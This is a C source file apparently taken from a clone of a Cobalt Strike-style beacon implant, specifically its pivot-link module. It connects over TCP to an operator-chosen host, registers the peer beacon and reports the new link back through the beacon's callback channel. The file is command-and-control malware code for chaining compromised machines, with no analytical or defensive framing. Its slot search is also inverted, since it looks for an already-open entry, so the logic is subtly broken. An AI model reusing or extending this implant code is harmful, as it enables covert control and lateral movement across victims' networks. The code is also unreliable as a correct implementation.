#include "pch.h"

#include "link.h"

#include "beacon.h"
#include "network.h"
#include "protocol.h"

typedef struct _LINK_ENTRY
{
	int bid;
	PROTOCOL protocol;
	BOOL isOpen;
	char* callbackData;
	int callbackLength;
	int lastPingTime;
} LINK_ENTRY;

LINK_ENTRY gLinks[28] = { 0 };

BOOL LinkAdd(PROTOCOL* protocol, int flags)
{
	char buffer[256] = { 0 };
	if (!protocol->waitForData(protocol, 30000, 10))
		return FALSE;

	int read = protocol->read(protocol, buffer, sizeof(buffer));
	if (read < 0)
		return FALSE;

	int bid = *(int*)buffer;
	LINK_ENTRY* openLink = NULL;
	for(int i = 0; i < sizeof(gLinks)/sizeof(gLinks[0]); i++)
	{
		if (gLinks[i].isOpen)
		{
			openLink = &gLinks[i];
			break;
		}
	}

	if (!openLink)
	{
		LERROR("Maximum links reached. Disconnect one");
		BeaconErrorNA(ERROR_MAXIMUM_LINKS_REACHED);
		return FALSE;
	}

	openLink->bid = bid;
	openLink->protocol = *protocol;
	openLink->isOpen = TRUE;

	if ( openLink->callbackData == NULL )
	{
		openLink->callbackData = malloc(0x100);

		if (openLink->callbackData == NULL)
			return FALSE;
	}

	formatp format;
	BeaconFormatUse(&format, openLink->callbackData, 0x100);
	BeaconFormatInt(&format, bid);
	BeaconFormatInt(&format, flags);
	BeaconFormatAppend(&format, buffer + sizeof(int), read - sizeof(int));

	openLink->callbackLength = BeaconDataLength(&format);
	BeaconOutput(CALLBACK_PIPE_OPEN, openLink->callbackData, openLink->callbackLength);

	return TRUE;
}

SOCKET LinkViaTcpConnect(char* target, short port)
{
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
	if (sock == INVALID_SOCKET)
		return INVALID_SOCKET;

	// Get host by name
	struct hostent* host = gethostbyname(target);
	if (host == NULL)
	{
		closesocket(sock);
		return INVALID_SOCKET;
	}

	struct sockaddr_in addr;
	memcpy(&addr.sin_addr, host->h_addr, host->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
	{
		closesocket(sock);
		return INVALID_SOCKET;
	}

	return sock;
}

#define PIVOT_HINT_REVERSE 0x10000
#define PIVOT_HINT_FORWARD 0
#define PIVOT_HINT_PROTO_PIPE 0
#define PIVOT_HINT_PROTO_TCP 0x100000

void LinkViaTcp(char* data, int length)
{
	int timeout = GetTickCount() + 15000;

	datap parser;
	BeaconDataParse(&parser, data, length);
	short port = BeaconDataShort(&parser);
	char* target = BeaconDataBuffer(&parser);
	NetworkInit();

	while(GetTickCount() < timeout)
	{
		SOCKET sock = LinkViaTcpConnect(target, port);
		if (sock != INVALID_SOCKET)
		{
			PROTOCOL protocol;
			ProtocolTcpInit(&protocol, sock);
			LinkAdd(&protocol, port | PIVOT_HINT_PROTO_TCP);
			return;
		}

		Sleep(1000);
	}

	DWORD error = WSAGetLastError();
	BeaconErrorD(ERROR_CONNECT_TO_TARGET_FAILED, error);	
}